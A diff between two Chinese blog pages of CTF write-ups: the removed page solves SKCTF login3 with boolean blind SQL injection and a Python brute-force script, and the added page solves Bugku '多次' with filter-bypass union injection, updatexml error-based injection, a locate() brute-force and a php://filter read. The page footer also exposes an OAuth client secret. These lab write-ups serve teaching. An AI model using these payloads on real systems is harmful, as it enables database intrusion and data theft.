@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>login3(SKCTF) &mdash; Evil</title>
+    <title>多次 &mdash; Evil</title>
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
@@ -23,29 +23,29 @@
     
 
     
-    <link rel="canonical" href="http://localhost:4000/2018/08/05/bk_login3/">
+    <link rel="canonical" href="http://localhost:4000/2018/08/03/bk_%E5%A4%9A%E6%AC%A1/">
     <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
     
     <link rel="shortcut icon" href="http://localhost:4000/images/favicon.ico" >
     
-    <meta property="og:title" content="login3(SKCTF)">
+    <meta property="og:title" content="多次">
       
     <meta name="keywords" content="Web Security">
     <meta name="og:keywords" content="Web Security">
       
-    <meta name="description" content="一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。">
-    <meta name="og:description" content="一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。">
+    <meta name="description" content="今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。">
+    <meta name="og:description" content="今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。">
       
     
     
         
     
-    <meta property="og:url" content="http://localhost:4000/2018/08/05/bk_login3/">
+    <meta property="og:url" content="http://localhost:4000/2018/08/03/bk_%E5%A4%9A%E6%AC%A1/">
     <meta property="og:site_name" content="Evil">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
     
-    <meta property="article:published_time" content="2018-08-05">
+    <meta property="article:published_time" content="2018-08-03">
     
     <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
@@ -77,16 +77,16 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="login3(SKCTF)">
+    <section class="collection-head small geopattern" data-pattern-id="多次">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">login3(SKCTF)</h1>
+        <h1 class="collection-header">多次</h1>
         <div class="collection-info">
           
           <span class="meta-info">
-            <span class="octicon octicon-calendar"></span> 2018/08/05
+            <span class="octicon octicon-calendar"></span> 2018/08/03
           </span>
           
           
@@ -113,7 +113,7 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。</p>
+    <p>今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。</p>
 
 <!--more-->
 
@@ -121,118 +121,176 @@
 
 <p><a href="http://ctf.bugku.com/challenges">题目链接</a></p>
 
-<p><img src="http://localhost:4000/images/blog/bk_log3.png" alt="多次" /></p>
+<p><img src="http://localhost:4000/images/blog/bk_dc1.png" alt="多次" /></p>
 
-<h2 id="0x02-解答">0x02 解答</h2>
+<h2 id="0x02-第一个-flag">0x02 第一个 flag</h2>
 
-<h3 id="step1尝试">step1:尝试</h3>
+<p><strong>step1: 老规矩，首先就是找注入点</strong></p>
 
-<p>拿到这种题目首先就是测试一下输入，我一般是用<code class="highlighter-rouge">admin admin</code>作为用户名和密码来测试，此时回显<code class="highlighter-rouge">password error!</code>也就是用户名是存在的，只是密码错误。</p>
+<p><code class="highlighter-rouge">/1ndex.php?id=1'</code> 报错，怀疑这里存在注入点(注意：这里注释要用<code class="highlighter-rouge">%23</code>不能用<code class="highlighter-rouge">#</code> [为什么？我暂时不知道，猜测是可能存在某种转码的问题⭐️] )</p>
 
-<p>然后测试一下<code class="highlighter-rouge">123 admin</code>，回显的是<code class="highlighter-rouge">username does not exist!</code>。这说明了啥呢？说明了在后台是对用户名进行查询了的，我们不妨猜测一下后台的 SQL 语句:</p>
+<p><strong>step2: 按照步骤此时判断字段数</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select username, password from users where username='XXX'
+<p><code class="highlighter-rouge">/1ndex.php?id=1' order by 4%23</code> 报错，然后又试了很多其他数字发现都是报错，此时猜测可能过滤了某些字符</p>
+
+<p><strong>step2.1: 判断过滤了哪些字符</strong></p>
+
+<p><code class="highlighter-rouge">/1ndex.php?id=1'^(length('union')&gt;0)%23</code>  不报错。</p>
+
+<p>这里是通过异或语句来判断过滤了哪些字符，当不报错，那么说明 <code class="highlighter-rouge">(length('union')&gt;0)</code> 是错的，也就是 <code class="highlighter-rouge">union</code> 被过滤了。用同样的方法去判断有哪些我们需要用到的字符或单词被过滤了，这里要注意一下当  <code class="highlighter-rouge">or</code> 被过滤，那么<code class="highlighter-rouge">order</code> 也会被影响。
+通过测试最终发现<code class="highlighter-rouge">select union or and</code> 都被过滤了，<code class="highlighter-rouge">limit from</code>没有被过滤。</p>
+
+<p><strong>step2.2: 继续判断字段数</strong></p>
+
+<p><code class="highlighter-rouge">/1ndex.php?id=1' order by 2%23</code> 不报错，字段数为 2</p>
+
+<p><strong>step3: 查找目标数据的老套路了</strong></p>
+
+<p>这里直接给最后一个 payload</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1ndex.php?id=-1%27 ununionion seselectlect 1,flag1 from flag1%23
 </code></pre></div></div>
 
-<p>根据以上分析，我们其实可以根据回显的不同进行布尔盲注。</p>
+<p>得到第一个 flag</p>
 
-<h3 id="step2-布尔盲注测试">step2: 布尔盲注测试</h3>
+<p>这个在查找字段的时候还找到一个字段的时候，还找到一个 <code class="highlighter-rouge">address</code>字段</p>
 
-<p>在进行布尔盲注测试的时候会发现这里过滤了一些字符(回显为<code class="highlighter-rouge">illegal character</code>)，这里过滤了<code class="highlighter-rouge">and 空格 逗号 等号 for information</code>。这里最精华的地方就是对这些过滤进行绕过：</p>
-
-<ol>
-  <li><code class="highlighter-rouge">and</code> &lt;—&gt; <code class="highlighter-rouge">^</code></li>
-  <li><code class="highlighter-rouge">等号</code> &lt;—&gt;<code class="highlighter-rouge">&lt;&gt;</code>（这里也可以用减号，看相减之后是否为 0，然后进行异或）</li>
-  <li><code class="highlighter-rouge">mid(xxx,from 1 for 1)</code> (for 和逗号被过滤)&lt;—&gt;<code class="highlighter-rouge">ascii()</code>(如果传入一个字符串那么就会取第一个字符的ascii码值)</li>
-</ol>
-
-<p>下面就是按照 SQL 注入的一般套路来：</p>
-
-<p><strong>1.先查询数据库名</strong></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin'^(ascii(mid(database()from(1)))&lt;&gt;1)#
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/1ndex.php?id=-1%27 ununionion seselectlect 1,address from flag1%23
 </code></pre></div></div>
 
-<p><strong>注：</strong></p>
+<p>得到第二关的地址</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mid() 和 substring() 相同:
-mid(xxx,1,1)
-mid(xxx,from 1 for 1)
+<h2 id="0x02-第二个-flag">0x02 第二个 flag</h2>
+
+<p>这里有两种方法来得解这题</p>
+
+<h3 id="1解法一updatexml-报错注入">1.解法一：updatexml 报错注入</h3>
+
+<p>这里继续使用之前的方法是没法绕过的，所以要尝试新方法<code class="highlighter-rouge">updatexml 报错注入</code> (为什么要用这个？暂时不知道⭐️)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UPDATEXML (XML_document, XPath_string, new_value);  
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc  
+第二个参数：XPath_string (Xpath格式的字符串)。  
+第三个参数：new_value，String格式，替换查找到的符合条件的数据  
+作用：改变文档中符合条件的节点的值
 </code></pre></div></div>
 
-<p>根据以上分析，我们可以构造暴破数据库名的脚本，首先 payload 为：</p>
+<p><strong>payload:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin'^(ascii(mid(database()from(1)))&lt;&gt;1)^0#
-或
-admin'^(ascii(mid(database()from(1)))&lt;&gt;1)#
-或
-admin'^(ascii(substring(database()from(1)))&lt;&gt;1)#
+<p>step1: 查询表名</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
 </code></pre></div></div>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#encoding: utf-8</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">string</span>
+<p><code class="highlighter-rouge">0x7e</code> —&gt; <code class="highlighter-rouge">~</code></p>
 
-<span class="n">rq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<p><strong>注意：这里 <code class="highlighter-rouge">group_concat()</code> 是因为回显不止一行，此时报错的信息为 <code class="highlighter-rouge">Subquery returns more than 1 row</code></strong></p>
 
-<span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://118.89.219.210:49167/index.php"</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">lowercase</span>
+<p>这里提交的是<code class="highlighter-rouge">~sql语句~</code>，是不符合xml格式的，所以会报错。报错会造成 <code class="highlighter-rouge">select group_concat(table_name) from information_schema.tables where table_schema=database()</code>语句的执行，所以可以注入。</p>
 
-<span class="c"># payload = "admin'^(ascii(mid(database()from(1)))&lt;&gt;1)^0#"</span>
+<p>此时回显：</p>
 
-
-<span class="k">def</span> <span class="nf">get_database</span><span class="p">():</span>
-	<span class="n">database</span> <span class="o">=</span> <span class="s">""</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
-		<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
-		<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
-			<span class="c">#上面三个 payload 任意一个都行</span>
-			<span class="n">payload</span> <span class="o">=</span> <span class="s">"admin'^(ascii(substring(database()from({})))&lt;&gt;{})#"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
-			<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-				<span class="s">"username"</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
-				<span class="s">"password"</span><span class="p">:</span> <span class="s">"admin"</span>
-			<span class="p">}</span>
-			<span class="n">response</span> <span class="o">=</span> <span class="n">rq</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-
-			<span class="k">if</span> <span class="s">"error"</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-				<span class="n">database</span> <span class="o">+=</span> <span class="n">j</span>
-				<span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
-			<span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-				<span class="k">break</span>
-		<span class="k">print</span> <span class="n">database</span>
-	<span class="k">print</span> <span class="n">database</span>
-
-
-<span class="n">get_database</span><span class="p">()</span>
-<span class="c"># blindsql</span>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+Nobody!
+XPATH syntax error: '~class,flag2~'
 </code></pre></div></div>
 
-<p><strong>2.查询表名</strong></p>
+<p>下面其实都是按照老套路来了，重点上面基本都讲完了。</p>
 
-<p>因为这里 <code class="highlighter-rouge">information</code> 被过滤了，按照原来的套路来就不行了。那应该怎么办呢？看别人的 writeup 说是猜测这里所要查询的表名是 admin，然后验证一下是否存在这样一个表<code class="highlighter-rouge">admin’^(select(1)from(admin))^1#</code>如果存在，那么回显<code class="highlighter-rouge">password error!</code>。</p>
+<p>step2: 查询字段名</p>
 
-<p><strong>这里要着重解释一下为什么在之前的 payload 和这里后面要多加一个<code class="highlighter-rouge">^1</code>或<code class="highlighter-rouge">^0</code>。</strong></p>
-
-<p>如果这里不在后面加<code class="highlighter-rouge">^1</code>，那么不管<code class="highlighter-rouge">(select(1)from(admin))</code>对或错都会回显<code class="highlighter-rouge">username does not exist!</code>。因为如果存在 <code class="highlighter-rouge">admin</code> 的话那么就是 <code class="highlighter-rouge">1^1=0</code>会回显<code class="highlighter-rouge">username does not exist!</code> ；如果不存在 <code class="highlighter-rouge">admin</code>，那么就会报错，报错在这里会回显<code class="highlighter-rouge">username does not exist!</code>。加了<code class="highlighter-rouge">^1</code>就很好的解决了这个问题，可以区分报错与正确。之前的 payload 也是为了防止这个问题。</p>
-
-<blockquote>
-  <p>因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。因为这里语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改与不改返回值相同，那就是有语法错误。</p>
-</blockquote>
-
-<p>[这里猜测外别的方法我暂时不知道。⭐️]</p>
-
-<p><strong>3.查询字段名</strong></p>
-
-<p>其实这里不需要查，因为我们还是猜测这里的字段名为<code class="highlighter-rouge">password</code>，这个没啥可说的。然后我们稍微验证一下<code class="highlighter-rouge">admin'^(select(count(password))from(admin))^1#</code>，回显<code class="highlighter-rouge">password error!</code>，说明是存在<code class="highlighter-rouge">pasword</code>字段的。</p>
-
-<p><strong>4.暴破目标数据</strong></p>
-
-<p>payload:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin'^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0#
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)%23
 </code></pre></div></div>
 
-<p>脚本跟之前的差不多，就不放了。</p>
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)#
+Nobody!
+XPATH syntax error: '~flag2,address~'
+</code></pre></div></div>
+
+<p>step3: 查询目标数据</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23
+</code></pre></div></div>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)#
+Nobody!
+XPATH syntax error: '~flag{Bugku-sql_*******-bug}~'
+</code></pre></div></div>
+
+<p>此时已经搞到答案了，将<code class="highlighter-rouge">B</code> 改成<code class="highlighter-rouge">b</code> 就是正确的 flag 了。</p>
+
+<p><strong>但是呢，这里还有第三关，本着探究的目的，稍后在第三节会继续深入。</strong></p>
+
+<p>查询第三关地址:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23
+</code></pre></div></div>
+
+<p>此时回显：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)#
+Nobody!
+XPATH syntax error: '~./Have_Fun.php~'
+</code></pre></div></div>
+
+<p>获取到第三关地址，第三关稍后再说。</p>
+
+<h3 id="2解法二locate--脚本暴破">2.解法二：locate() + 脚本暴破</h3>
+
+<p><code class="highlighter-rouge">sleep  substr</code>都被过滤掉了，我们转而使用 <code class="highlighter-rouge">locate</code> 函数达到同样的效果。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>语法一:
+locate(substr,str)
+返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0。
+eg:
+locate('jd','jdgood')=1
+注意: 下标从 1 开始
+
+语法二:
+locate(substr,str,pos)
+返回子串 substr 在字符串 str 中第一次出现的位置,从位置 pos 开始。
+eg:
+mysql&gt; select locate('bar', 'foobarbar', 5);
+mysql&gt; 7
+</code></pre></div></div>
+
+<p>根据 locate 上述语法特性就可以构造 payload 了。</p>
+
+<p><strong>payload</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url = "/Once_More.php?id=1'and  (select locate(binary'"+str(j)+"',(select flag2 from flag2),"+str(i)+"))="+str(i)+"%23"
+</code></pre></div></div>
+
+<p>按照 SQL 注入的老套路来进行暴破就可以了，最终可以得到 flag。</p>
+
+<h2 id="0x03-第三个-flag">0x03 第三个 flag</h2>
+
+<p><strong>tips:</strong></p>
+
+<p>XXF 绕过第一个问题</p>
+
+<p>之后会得到一个二维码，扫描之后得到</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>你……你……你可以看到我?
+好吧，我来自于ErWeiMa.php
+顺便告诉你两个密码
+one:参数名是game;
+tow:flag在admin里
+对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c……
+</code></pre></div></div>
+
+<p>根据得到的信息构造 <strong>payload</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /Have_Fun.php 
+
+game=php://filter/convert.base64-encode/resource=admin.php
+</code></pre></div></div>
+
+<p>得到第三个 flag，直接提交就可以了。</p>
 
 
     </article>
@@ -240,10 +298,10 @@ admin'^(ascii(substring(database()from(1)))&lt;&gt;1)#
     <div class="newold">
   <hr>
   
-  <b>上一篇: <a href="/2018/08/03/bk_%E5%A4%9A%E6%AC%A1/">多次</a></b><br>
+  <b>上一篇: <a href="/2018/08/01/sql_injection1/">SQL注入的套路</a></b><br>
      
   
-  <b>下一篇: <a href="/2018/08/05/tpb/">当我谈跑步时，我谈些什么</a></b>
+  <b>下一篇: <a href="/2018/08/05/bk_login3/">login3(SKCTF)</a></b>
    
 </div><!--上一篇 下一篇-->
 
@@ -261,7 +319,7 @@ admin'^(ascii(substring(database()from(1)))&lt;&gt;1)#
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2018/08/05/bk_login3/',
+            id: '/2018/08/03/bk_%E5%A4%9A%E6%AC%A1/',
             clientID: '5a59fdc570f933e0c2ee',
             clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
             repo: 'blogcomments',
